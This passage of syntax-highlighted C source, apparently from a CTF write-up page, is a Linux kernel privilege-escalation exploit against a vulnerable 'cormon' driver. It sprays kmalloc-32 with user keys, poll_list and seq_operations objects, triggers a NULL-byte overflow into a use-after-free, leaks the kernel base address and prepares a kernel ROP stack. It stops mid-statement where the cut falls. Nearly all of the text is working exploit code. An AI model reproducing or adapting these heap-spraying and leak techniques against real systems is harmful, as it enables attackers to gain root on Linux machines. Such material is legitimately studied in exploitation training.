</span></span><span style=display:flex><span><span style=color:#75715e>#define NUM_PREPARE_KM32_SPRAY 2000
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define NUM_POLLFD (30 + 510 + 1) </span><span style=color:#75715e>// stack, kmalloc-4k, kmalloc-32
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#define NUM_1ST_POLLLIST_ALLOC (0x10 - 0x1 + 0x1)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define NUM_2ND_POLLLIST_ALLOC (0x120 + 0x20 + 0x40 + 0x40 + 0x40 + 0x200)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define TIMEOUT_POLLFD 2000 </span><span style=color:#75715e>// 2s
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define NUM_TTY_SPRAY (0x100)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define NUM_SEQOPERATIONS (NUM_1ST_POLLLIST_ALLOC + 0x100)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define NUM_FREE_SEQOPERATIONS (0x160)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define KADDR(addr) ((ulong)addr - 0xffffffff81000000 + kbase)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>/*********** globals ******************/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> cormon_fd;
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> just_fd;
</span></span><span style=display:flex><span>key_serial_t keys[NUM_KEY_SPRAY <span style=color:#f92672>*</span> <span style=color:#ae81ff>5</span>] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>};
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> seqops_fd[<span style=color:#ae81ff>0x500</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> tty_fd[NUM_TTY_SPRAY <span style=color:#f92672>*</span> <span style=color:#ae81ff>2</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>cormon_buf[<span style=color:#ae81ff>0x1000</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x20</span>] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>};
</span></span><span style=display:flex><span>pthread_t threads[<span style=color:#ae81ff>0x1000</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> num_threads <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>pthread_mutex_t mutex <span style=color:#f92672>=</span> PTHREAD_MUTEX_INITIALIZER;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ulong kbase <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> neverend <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>krop_stack <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span><span style=color:#75715e>#define KROP_USTACK_SIZE 0x10000
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>/*********** utils ******************/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> num_keys <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>ulong _alloc_key_prefill_ulong_val <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>_alloc_key_prefill_ulong</span>() {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>data <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (data <span style=color:#f92672>==</span> NULL) data <span style=color:#f92672>=</span> calloc(<span style=color:#ae81ff>0x1000</span>, <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>  <span style=color:#75715e>//for (int ix = 0; ix != 32 / 8; ++ix) ((ulong*)data)[ix] = _alloc_key_prefill_ulong_val;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  ((ulong<span style=color:#f92672>*</span>)data)[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> _alloc_key_prefill_ulong_val;
</span></span><span style=display:flex><span>  setxattr(<span style=color:#e6db74>&#34;/home/user/.bashrc&#34;</span>, <span style=color:#e6db74>&#34;user.x&#34;</span>, data, <span style=color:#ae81ff>32</span>, XATTR_CREATE);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>_alloc_key_prefill_null</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>  _alloc_key_prefill_ulong_val <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  _alloc_key_prefill_ulong();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>alloc_key</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>payload, <span style=color:#66d9ef>int</span> size, <span style=color:#66d9ef>void</span> (<span style=color:#f92672>*</span>prefill)(<span style=color:#66d9ef>void</span>)) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>desc <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (desc <span style=color:#f92672>==</span> NULL) desc <span style=color:#f92672>=</span> calloc(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0x1000</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  sprintf(desc, <span style=color:#e6db74>&#34;key_%d&#34;</span>, num_keys);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (prefill <span style=color:#f92672>!=</span> NULL) prefill();
</span></span><span style=display:flex><span>  keys[num_keys] <span style=color:#f92672>=</span> add_key(<span style=color:#e6db74>&#34;user&#34;</span>, desc, payload, size, KEY_SPEC_PROCESS_KEYRING);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (keys[num_keys] <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;alloc_key&#34;</span>);
</span></span><span style=display:flex><span>  num_keys<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>spray_keys</span>(<span style=color:#66d9ef>int</span> num, <span style=color:#66d9ef>char</span> c) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>payload <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (payload <span style=color:#f92672>==</span> NULL) payload <span style=color:#f92672>=</span> calloc(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0x1000</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>key_payload <span style=color:#f92672>=</span> malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
</span></span><span style=display:flex><span>  memset(key_payload, c, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> num; <span style=color:#f92672>++</span>ix) alloc_key(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_null);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>free_key</span>(key_serial_t key) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (keyctl_revoke(key) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;keyctl_revoke&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (keyctl_unlink(key, KEY_SPEC_PROCESS_KEYRING) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;keyctl_unlink&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#f92672>--</span>num_keys;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> alloc_poll_list_t {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> fd;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> id;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> num_size;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> timeout_ms;
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> <span style=color:#a6e22e>alloc_poll_list</span>(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>_arg) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> pollfd fds[NUM_POLLFD];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> alloc_poll_list_t <span style=color:#f92672>*</span>arg <span style=color:#f92672>=</span> (<span style=color:#66d9ef>struct</span> alloc_poll_list_t <span style=color:#f92672>*</span>)_arg;
</span></span><span style=display:flex><span>  assert(arg<span style=color:#f92672>-&gt;</span>fd <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> arg<span style=color:#f92672>-&gt;</span>num_size; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    fds[ix].fd <span style=color:#f92672>=</span> arg<span style=color:#f92672>-&gt;</span>fd;
</span></span><span style=display:flex><span>    fds[ix].events <span style=color:#f92672>=</span> POLLERR;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  pthread_mutex_lock(<span style=color:#f92672>&amp;</span>mutex);
</span></span><span style=display:flex><span>    <span style=color:#f92672>++</span>num_threads;
</span></span><span style=display:flex><span>  pthread_mutex_unlock(<span style=color:#f92672>&amp;</span>mutex);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  thread_assign_to_core(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (poll(fds, arg<span style=color:#f92672>-&gt;</span>num_size, arg<span style=color:#f92672>-&gt;</span>timeout_ms) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;poll&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  pthread_mutex_lock(<span style=color:#f92672>&amp;</span>mutex);
</span></span><span style=display:flex><span>    <span style=color:#f92672>--</span>num_threads;
</span></span><span style=display:flex><span>  pthread_mutex_unlock(<span style=color:#f92672>&amp;</span>mutex);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (neverend) {
</span></span><span style=display:flex><span>    thread_assign_to_core(<span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span>(neverend);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> NULL;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>nullbyte_overflow</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>  assert(cormon_fd <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>  memset(cormon_buf, <span style=color:#e6db74>&#39;B&#39;</span>, <span style=color:#ae81ff>0x1000</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x20</span>);
</span></span><span style=display:flex><span>  strcpy((<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)cormon_buf <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;THIS_IS_CORMON_BUFFER&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>cormon_buf <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span>(write(cormon_fd, cormon_buf, <span style=color:#ae81ff>0x1000</span>) <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) errExit(<span style=color:#e6db74>&#34;nullbyte_overflow&#34;</span>);
</span></span><span style=display:flex><span>  errno <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#75715e>// `write()` above must fail, so clear errno here
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/*********** main ******************/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[]) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>keybuf <span style=color:#f92672>=</span> malloc(<span style=color:#ae81ff>0x5000</span>); <span style=color:#75715e>// must be &gt;= 0x4330 (low 2byte of single_next())
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  puts(<span style=color:#e6db74>&#34;[.] Starting exploit.&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;[+] preparing stack for later kROP...&#34;</span>);
</span></span><span style=display:flex><span>  save_state();
</span></span><span style=display:flex><span>  krop_stack <span style=color:#f92672>=</span> mmap((<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x10000000</span>, KROP_USTACK_SIZE, PROT_READ <span style=color:#f92672>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#f92672>|</span> MAP_ANONYMOUS <span style=color:#f92672>|</span> MAP_FIXED, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (krop_stack <span style=color:#f92672>==</span> MAP_FAILED) errExit(<span style=color:#e6db74>&#34;mmap&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  assign_to_core(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ((cormon_fd <span style=color:#f92672>=</span> open(DEV_PATH, O_RDWR)) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>2</span>) errExit(<span style=color:#e6db74>&#34;open cormon&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Pre-spray kmalloc-32
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  puts(<span style=color:#e6db74>&#34;[+] pre-spraying kmalloc-32...&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_PREPARE_KM32_SPRAY; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (open(<span style=color:#e6db74>&#34;/proc/self/stat&#34;</span>, O_RDONLY) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>2</span>) errExit(<span style=color:#e6db74>&#34;prespray&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Spray victim `user_key_payload` in kmalloc-32
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  puts(<span style=color:#e6db74>&#34;[+] Spraying keys...&#34;</span>);
</span></span><span style=display:flex><span>  spray_keys(NUM_KEY_SPRAY, <span style=color:#e6db74>&#39;A&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Spray poll_list in kmalloc-32 and kmalloc-4k
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  just_fd <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/etc/hosts&#34;</span>, O_RDONLY);
</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;[+] Spraying poll_list (fd=%d)...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, just_fd);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (just_fd <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>2</span>) errExit(<span style=color:#e6db74>&#34;just_fd&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  assign_to_core(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>  num_threads <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_1ST_POLLLIST_ALLOC <span style=color:#f92672>+</span> <span style=color:#ae81ff>3</span>; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> alloc_poll_list_t <span style=color:#f92672>*</span>arg <span style=color:#f92672>=</span> malloc(<span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> alloc_poll_list_t));
</span></span><span style=display:flex><span>    arg<span style=color:#f92672>-&gt;</span>fd <span style=color:#f92672>=</span> just_fd; arg<span style=color:#f92672>-&gt;</span>id <span style=color:#f92672>=</span> ix;
</span></span><span style=display:flex><span>    arg<span style=color:#f92672>-&gt;</span>timeout_ms <span style=color:#f92672>=</span> ix <span style=color:#f92672>&lt;</span> NUM_1ST_POLLLIST_ALLOC <span style=color:#f92672>?</span> TIMEOUT_POLLFD : <span style=color:#ae81ff>1</span>;;
</span></span><span style=display:flex><span>    arg<span style=color:#f92672>-&gt;</span>num_size <span style=color:#f92672>=</span> NUM_POLLFD;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(pthread_create(<span style=color:#f92672>&amp;</span>threads[ix], NULL, alloc_poll_list, arg) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;pthread_create&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Wait some of `poll_list` in kmalloc-4k is freed (these are expected to be reused by cormon_proc_write())
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  assign_to_core(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  usleep(<span style=color:#ae81ff>500</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000</span>); <span style=color:#75715e>// wait threads are initialized
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> NUM_1ST_POLLLIST_ALLOC; ix <span style=color:#f92672>&lt;</span> NUM_1ST_POLLLIST_ALLOC <span style=color:#f92672>+</span> <span style=color:#ae81ff>3</span>; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    pthread_join(threads[ix], NULL);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Spray again victim `user_key_payload` in kmalloc-32
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  spray_keys(NUM_KEY_SPRAY, <span style=color:#e6db74>&#39;A&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// NULL-byte overflow (hopelly) on `poll_list`, whose `next` pointer get pointing to `user_key_payload` in kmalloc-32.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  puts(<span style=color:#e6db74>&#34;[+] NULL-byte overflow ing...&#34;</span>);
</span></span><span style=display:flex><span>  nullbyte_overflow();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Wait all `poll_list` are freed
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_1ST_POLLLIST_ALLOC; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    open(<span style=color:#e6db74>&#34;/proc/self/stat&#34;</span>, O_RDONLY);
</span></span><span style=display:flex><span>    pthread_join(threads[ix], NULL);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;[+] Freed all &#39;poll_list&#39;&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Place `seq_operations` on UAFed `user_key_payload` in kmalloc-32
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_SEQOPERATIONS; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ((seqops_fd[ix] <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/proc/self/stat&#34;</span>, O_RDONLY)) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>2</span>) errExit(<span style=color:#e6db74>&#34;open seqops&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Check all keys to leak kbase via `seq_operations`
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  ulong single_show <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  key_serial_t uafed_key <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_KEY_SPRAY <span style=color:#f92672>*</span> <span style=color:#ae81ff>2</span>; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> num_read;
</span></span><span style=display:flex><span>    memset(keybuf, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x5000</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>((num_read <span style=color:#f92672>=</span> keyctl_read(keys[ix], keybuf, <span style=color:#ae81ff>0x5000</span>)) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;keyctl_read&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (strncmp(keybuf, <span style=color:#e6db74>&#34;AAAA&#34;</span>, <span style=color:#ae81ff>4</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>      single_show <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(ulong<span style=color:#f92672>*</span>)keybuf;
</span></span><span style=display:flex><span>      uafed_key <span style=color:#f92672>=</span> keys[ix];
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (single_show <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>        puts(<span style=color:#e6db74>&#34;[-] somehow, empty key found&#34;</span>);
</span></span><span style=display:flex><span>      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (single_show <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;[-] Failed to leak kbase&#34;</span>);
</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;[!] leaked single_show: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, single_show);
</span></span><span style=display:flex><span>  kbase <span style=color:#f92672>=</span> single_show <span style=color:#f92672>-</span> (<span style=color:#ae81ff>0xffffffff813275c0</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0xffffffff81000000</span>);
</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;[!] leaked kbase: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, kbase);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Free all keys except UAFed key
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_KEY_SPRAY <span style=color:#f92672>*</span> <span style=color:#ae81ff>2</span>; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (keys[ix] <span style=color:#f92672>!=</span> uafed_key) free_key(keys[ix]);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  sleep(<span style=color:#ae81ff>1</span>); <span style=color:#75715e>// wait GC(security/keys/gc.c) actually frees keys
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Place `tty_file_private` on UAFed `user_key_payload` in kmalloc-32
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_TTY_SPRAY; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ((tty_fd[ix] <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/dev/ptmx&#34;</span>, O_RDWR <span style=color:#f92672>|</span> O_NOCTTY)) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>2</span>) errExit(<span style=color:#e6db74>&#34;open tty&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Read `tty_file_private.tty` which points to `tty_struct` in kmalloc-1024
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  memset(keybuf, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0x5000</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> num_read <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span>((num_read <span style=color:#f92672>=</span> keyctl_read(uafed_key, keybuf, <span style=color:#ae81ff>0x5000</span>)) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;keyctl_read&#34;</span>);
</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;[+] read 0x%x bytes from UAFed key</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, num_read);
</span></span><span style=display:flex><span>  ulong km1024_leaked <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  ulong <span style=color:#f92672>*</span>tmp <span style=color:#f92672>=</span> (ulong<span style=color:#f92672>*</span>)keybuf <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0x4330</span><span style=color:#f92672>/</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (
